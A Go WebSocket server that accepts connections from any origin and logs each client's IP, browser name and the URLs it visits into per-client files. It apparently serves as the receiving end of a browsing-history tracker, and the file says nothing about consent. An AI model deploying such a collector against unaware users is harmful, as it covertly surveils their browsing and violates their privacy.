package main

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
	clients    = make(map[*websocket.Conn]*clientInfo)
	clientsMtx sync.Mutex
)

type clientInfo struct {
	IP          string
	BrowserName string
}

func main() {
	http.HandleFunc("/ws", handleConnections)
	go func() {
		fmt.Println("Server listening on :8081")
		err := http.ListenAndServe(":8081", nil)
		if err != nil {
			panic("Error starting server: " + err.Error())
		}
	}()

	select {}
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("Error upgrading connection:", err)
		return
	}
	defer conn.Close()

	clientIP := getClientIP(r)

	clientsMtx.Lock()
	client := &clientInfo{
		IP:          clientIP,
		BrowserName: "Unknown",
	}
	clients[conn] = client
	clientsMtx.Unlock()

	color.New(color.FgHiBlack).Printf("Connected: IP=%s\n", clientIP)

	// Create a directory for the user
	userDirectory := formatDirectory(fmt.Sprintf("%s@%s", client.BrowserName, clientIP))
	err = os.MkdirAll(userDirectory, os.ModePerm)
	if err != nil {
		fmt.Printf("Error creating directory: %v\n", err)
	}

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			color.New(color.FgHiBlack).Printf("Connection closed: IP=%s\n", clientIP)
			clientsMtx.Lock()
			delete(clients, conn)
			clientsMtx.Unlock()
			break
		}
		if messageType == websocket.TextMessage {
			message := string(p)
			if strings.HasPrefix(message, "BrowserConnected|") {
				newBrowserName := strings.TrimPrefix(message, "BrowserConnected|")
				clientsMtx.Lock()
				client.BrowserName = newBrowserName
				clientsMtx.Unlock()
				// Rename the user directory to include the browser name
				newUserDirectory := formatDirectory(fmt.Sprintf("%s@%s", client.BrowserName, clientIP))
				err := os.Rename(userDirectory, newUserDirectory)
				if err != nil {
					fmt.Printf("Error renaming directory: %v\n", err)
				}
				userDirectory = newUserDirectory
			} else if strings.HasPrefix(message, "VisitedURL:") {
				url := strings.TrimPrefix(message, "VisitedURL:")
				clientsMtx.Lock()
				color.New(color.FgCyan).Printf("[%s@%s] %s\n", client.BrowserName, clientIP, url)
				clientsMtx.Unlock()
				// Save the visited URL in the user's directory
				saveURLToFile(userDirectory, url)
			}
		}
	}
}

func getClientIP(r *http.Request) string {
	ip := r.Header.Get("X-Real-IP")
	if ip == "" {
		ip = r.Header.Get("X-Forwarded-For")
	}
	if ip == "" {
		ip, _, _ = net.SplitHostPort(r.RemoteAddr)
	}
	return ip
}

func formatDirectory(directoryName string) string {
	return strings.ReplaceAll(strings.ReplaceAll(directoryName, ":", ";"), ".", ";")
}

func saveURLToFile(directory, url string) {
	file, err := os.OpenFile(fmt.Sprintf("%s/visited_urls.txt", directory), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(url + "\n")
	if err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
	}
}
